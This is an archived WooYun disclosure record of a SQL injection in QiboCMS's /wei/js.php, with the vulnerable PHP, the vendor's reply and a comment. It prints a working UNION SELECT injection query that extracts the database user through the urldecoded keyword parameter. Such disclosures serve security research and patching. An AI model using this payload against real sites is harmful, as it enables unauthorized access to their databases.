{"id": 42777, "wybug_id": "wooyun-2014-084682", "wybug_title": "齐博CMS注入漏洞4", "wybug_corp": "齐博CMS", "wybug_author": "Power", "wybug_date": "2014-12-01 11:09", "wybug_open_date": "2015-03-01 11:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-05：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-01-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-01：\t细节向公众公开  简要描述： 让你不给我rank,我就接着挖.跟上次差不多 详细说明：  /wei/js.php中\nif($type=='hot'||$type=='com'||$type=='new'||$type=='lastview'||$type=='like'){\tif($f_id)\t{\t\tif(is_numeric($f_id)){\t\t\t$SQL=\" fid=$f_id \";\t\t}else{\t\t\t$detail=explode(\",\",$f_id);\t\t\t$SQL=\" fid IN ( \".implode(\",\",$detail).\" ) \";\t\t}\t}\telse\t{\t\t$SQL=\" 1 \";\t}\tif($type=='com')\t{\t\t$SQL.=\" AND levels=1 \";\t\t$ORDER=' list ';\t\t$_INDEX=\" USE INDEX ( list ) \";\t}\telseif($type=='hot')\t{\t\t$ORDER=' hits ';\t\t$_INDEX=\" USE INDEX ( hits ) \";\t}\telseif($type=='new')\t{\t\t$ORDER=' list ';\t\t$_INDEX=\" USE INDEX ( list ) \";\t}\telseif($type=='lastview')\t{\t\t$ORDER=' lastview ';\t\t$_INDEX=\" USE INDEX ( lastview ) \";\t}\telseif($type=='like')\t{\t\t$SQL.=\" AND id!='$id' \";\t\tif(!$keyword)\t\t{\t\t\textract($db->get_one(\"SELECT keywords AS keyword FROM {$_pre}content WHERE id='$id'\"));\t\t}\t\tif($keyword){\t\t\t$SQL.=\" AND ( \";\t\t\t$keyword=urldecode($keyword);   //URLDECODE解码\t\t\t$detail=explode(\" \",$keyword);  //分解$keyword关键字为数组\t\t\tunset($detail2);\t\t\tforeach( $detail AS $key=>$value){ //将数组拆分\t\t\t\t$detail2[]=\" BINARY title LIKE '%$value%' \";\t\t\t}\t\t\t$str=implode(\" OR \",$detail2);\t\t\t$SQL.=\" $str ) \";\t\t}else{\t\t\t$SQL.=\" AND 0 \";\t\t}\t\t$_INDEX=\" USE INDEX ( list ) \";\t\t$ORDER=' list ';\t}\t$SQL=\" $_INDEX WHERE $SQL AND yz=1 ORDER BY $ORDER DESC LIMIT $rows\";\t$which='*';\t$_target=$target?'_blank':'_self';\tif($path){\t\t$_path=preg_replace(\"/(.*)\\/([^\\/]+)/is\",\"\\\\1/\",$WEBURL);\t}\tif($icon==1){\t\t$_icon=\"·\";\t}else{\t\t$_icon=\"&nbsp;\";\t}\t$listdb=listcontent($SQL,$which,$leng);  //带入SQL语句\tforeach($listdb AS $key=>$rs)\t{\t\t$show.=\"$_icon<A target='$_target' HREF='{$_path}bencandy.php?fid=$rs[fid]&id=$rs[id]' title='$rs[full_title]'>$rs[title]</A><br>\";\t}\tif(!$show){\t\t$show=\"暂无...\";\t}\n下面为listcontent函数\nfunction listcontent($SQL,$which='*',$leng=40){\tglobal $db,$_pre;\t$query=$db->query(\"SELECT $which FROM {$_pre}content $SQL\"); //进行查询\twhile( $rs=$db->fetch_array($query) ){\t\t//$rs[content]=@preg_replace('/<([^>]*)>/is',\"\",$rs[content]);\t//把HTML代码过滤掉\t\t//$rs[content]=get_word($rs[full_content]=$rs[content],100);\t\t$rs[title]=get_word($rs[full_title]=$rs[title],$leng);\t\t$rs[posttime]=date(\"Y-m-d\",$rs[posttime]);\t\tif($rs[picurl]){\t\t\t$rs[picurl]=tempdir($rs[picurl]);\t\t}\t\t$listdb[]=$rs;\t}\treturn $listdb;}\n数据库执行语句如下\nSELECT * FROM qb_wei_content   USE INDEX ( list )  WHERE  fid=1  AND id!='0'  AND (   BINARY title LIKE '%n%')UNION/**/SELECT/**/1,user(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51#%'  )  AND yz=1 ORDER BY  list  DESC LIMIT 7\n总结：问题在urldecode函数处首先将$keyword进行urldecode解码然后将$keyword使用explode函数以空格为单位拆分为数组，将数组foreach循环并将$value赋值到$detail2数组将$detail2数组使用implode函数组合为字符串，带入数据库，导致注入   漏洞证明：  两个网站\n\n\n\n   修复方案：  URLDECODE貌似也没啥用。   版权声明：转载请注明来源 Power@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2014-12-02 09:30 厂商回复： URLDECODE 这个是老问题，之前有人提过的了，已经修复过的了。只是有的用户一直没有打过此补丁 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-23 14:31 |    \t\tAno_Tom \t\t\t( 普通白帽子  |\t\t\t        Rank:368 漏洞数:40        | Talk is cheap.:)\t\t \n  楼主你这提交的四个二次注入都修复了的    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}